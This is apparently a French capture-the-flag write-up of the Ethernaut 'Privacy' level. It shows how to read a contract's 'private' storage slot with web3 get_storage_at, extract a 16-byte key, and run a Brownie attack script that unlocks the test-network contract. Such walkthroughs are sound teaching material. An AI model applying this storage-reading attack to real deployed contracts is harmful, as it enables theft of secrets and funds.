# Privacy

## Objectif

L'objectif de ce niveau est de trouver le mot de passe permettant de débloquer le contrat

## Déblocage du contrat

Pour débloquer le contrat, nous devons le bon mot de passe à la méthode [`unlock`](contracts/privacy.sol#18)

```
require(_key == bytes16(data[2]));
```

`data` est déclarée par:
```
bytes32[3] private data;
```

Dans le langage solidity `private` signifie que cette variable n'est pas directement visible par d'autre contrat, mais il est possible de lire sa valeur en connaissant son `slot` de stockage.

A partir de la déclaration des membres de ce contrat:
```
  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;
```
nous pouvons déduire que `data` est stocké dans le `slot` d'index 5.

Nous pouvons récupérer le contenu de data via l'appel suivant:
```
data_key = web3.eth.get_storage_at(address, 5)
```

La comparaison de la clé s'effectue avec `bytes16(data[2])`, nous n'avons besoin que des 16 premiers octet

## Exécution du script d'attaque
Afin de pouvoir agir sur la chaine `rinkeby`, il est nécessaire de créer un fichier `.env` contenant la clé de projet [Infura](https://infura.io/) et la valeur de la clé privée du compte utilisé pour le challenge:
```shell
export WEB3_INFURA_PROJECT_ID='AABBCCDD.......'
export PRIVATE_KEY='0xDEADBEEFCACA...'
```

En utilisant la console sur le site d'[ethernaut openzeppelin](https://ethernaut.openzeppelin.com/level/0x11343d543778213221516D004ED82C45C3c8788B) on récupère l'adresse du contrat déployé pour lancer l'attaque ainsi:
```bash
brownie run scripts/attack.py main "0x5F8d3B98337a13DC1143666079f6B660C9a4C5C2" --network rinkeby
```
```console
Brownie v1.18.1 - Python development framework for Ethereum

PrivacyProject is the active project.

Running 'scripts/attack.py::main'...
Locked: True
Transaction sent: 0x931ee56e6050d0b4ec21b8fb04847c7b61bea026082962ec480a61b682a3c6fb
  Gas price: 1.000000011 gwei   Gas limit: 31768   Nonce: 261
  Transaction confirmed   Block: 10568121   Gas used: 24080 (75.80%)

Locked: False
```


